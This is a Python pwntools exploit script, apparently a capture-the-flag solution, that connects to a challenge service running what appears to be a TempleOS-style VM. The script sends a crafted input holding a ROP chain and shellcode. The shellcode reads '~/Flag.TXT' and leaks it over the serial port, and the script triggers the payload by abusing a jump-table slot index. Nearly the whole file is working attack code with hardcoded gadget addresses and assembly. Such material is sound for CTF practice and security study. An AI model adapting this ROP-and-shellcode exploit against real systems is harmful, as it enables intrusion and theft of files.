#!/usr/bin/env python3
#
# @mebeim - 2025-03-15
#

import os
import sys

os.environ['PWNLIB_NOTERM'] = '1'
os.environ['PWNLIB_STDERR'] = '1'
from pwn import context, log, remote, asm, flat


HOST = os.getenv('HOST', 'localhost')
PORT = int(os.getenv('PORT', 1337))

def expl(r: remote, payload: bytes, slot_idx: int) -> bool:
	log.info('Waiting for VM startup...')
	if r.recvuntil(b'What do you want to do?', timeout=15) == b'':
		log.failure('Timed out waiting for initial prompt')
		return False

	r.sendlineafter(b'> ', b'1')
	r.sendafter(b'Which book? ', payload)
	r.sendlineafter(b'How many lines? ', b'1')

	if r.recvuntil(b'"!\n', timeout=3) == b'':
		log.failure('Timed out waiting for output (1)')
		return False

	log.info('Triggering expl...')
	r.sendlineafter(b'> ', str(slot_idx).encode())

	if r.recvuntil(b'---\n', timeout=3) == b'':
		log.failure('Timed out waiting for output (2)')
		return False

	flag = r.recvuntil(b'}', timeout=3)
	if flag == b'':
		log.failure('Timed out waiting for flag')
		return False

	print(flag.decode())
	return True


def main() -> int:
	context(arch='amd64')

	Yield    = 0x105c5
	FileRead = 0x38ccc
	stack    = 0x369a20b8

	DoCommand = 0x3677bc28
	jump_table = DoCommand + 0x2e3
	slot_addr  = 0x115a7
	slot_idx   = (slot_addr - jump_table) // 2

	payload = flat([
		0x41414141        ,
		0x000000000000b039, # pop rax ; ret
		stack             ,
		0x00000000000ea85f, # push rsp ; add dword ptr [rax], eax ; add byte ptr [rbx + 0x5e], bl ; pop rdi ; pop rbp ; ret
		0x41414141        ,
		0x000000000000b039, # pop rax ; ret
		8 * 5             ,
		0x00000000000ca95d, # add edi, eax ; ret
		0x00000000000cd540, # push rdi ; ret
	])

	payload += asm(f'''
		/* FileRead("~/Flag.TXT", NULL, NULL); */
		push 0
		push 0
		lea eax, [rip + fname]
		push rax
		mov eax, {FileRead}
		call rax

		mov esi, eax
		mov ecx, 100
		mov edi, {Yield}

	wait:
		mov dx, 0x3f8 + 5
		in al, dx
		and al, 0x20
		jnz ok
		call rdi
		jmp wait
	ok:
		mov dx, 0x3f8
		mov al, [esi]
		out dx, al
		inc esi
		loop wait

	done:
		call rdi
		jmp done

	fname:
		.asciz "~/Flag.TXT"
	''')

	assert len(payload) <= 149
	assert b'\n' not in payload

	if len(payload) < 149:
		payload += b'\n'


	for i in range(10):
		with context.local(log_level='error'):
			r = remote(HOST, PORT)

		if expl(r, payload, slot_idx):
			return 0

		with context.local(log_level='error'):
			r.close()

	log.failure('Exceeded 10 exploit attempts')
	return 1


if __name__ == '__main__':
	sys.exit(main())
